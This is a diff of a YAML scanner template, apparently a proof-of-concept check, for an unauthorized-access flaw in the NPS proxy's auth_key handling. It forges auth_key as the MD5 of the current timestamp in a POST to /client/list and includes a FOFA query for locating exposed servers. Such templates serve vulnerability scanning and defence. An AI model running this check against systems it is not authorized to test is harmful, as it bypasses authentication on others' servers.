@@ -1,27 +1,27 @@
-expression: r0()
 id: nps-auth-key-unauthorized-access
+
 info:
+  name: NPS auth_key 未授权访问漏洞
   author: daffainfo
-  description: "NPS auth_key \u5B58\u5728\u672A\u6388\u6743\u8BBF\u95EE\u6F0F\u6D1E\
-    \uFF0C\u5F53 nps.conf \u4E2D\u7684 auth_key \u672A\u914D\u7F6E\u65F6\u653B\u51FB\
-    \u8005\u901A\u8FC7\u751F\u6210\u7279\u5B9A\u7684\u8BF7\u6C42\u5305\u53EF\u4EE5\
-    \u83B7\u53D6\u670D\u52A1\u5668\u540E\u53F0\u6743\u9650\nfofa-query: body=\"serializeArray()\"\
-    \ && body=\"/login/verify\"\n"
-  name: "NPS auth_key \u672A\u6388\u6743\u8BBF\u95EE\u6F0F\u6D1E"
-  reference:
-  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NPS%20auth_key%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
   severity: critical
   verified: true
+  description: |-
+    NPS auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限
+    fofa: body="serializeArray()" && body="/login/verify"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NPS%20auth_key%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
+  tags: nps,unauth,fileread
+  created: 2023/09/05
+
+set:
+  tstamp: timestamp_second()
+  auth_key: md5(tstamp)
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'"bridgePort":')
-      && response.body.bcontains(b'"bridgeType":')
     request:
-      body: 'search=&order=asc&offset=0&limit=10&auth_key={{auth_key}}&timestamp={{tstamp}}
-
-        '
       method: POST
       path: /client/list
-set:
-  auth_key: md5(tstamp)
-  tstamp: timestamp_second(0)
+      body: |
+        search=&order=asc&offset=0&limit=10&auth_key={{auth_key}}&timestamp={{tstamp}}
+    expression: response.status == 200 && response.body.bcontains(b'"bridgePort":') && response.body.bcontains(b'"bridgeType":')
+expression: r0()
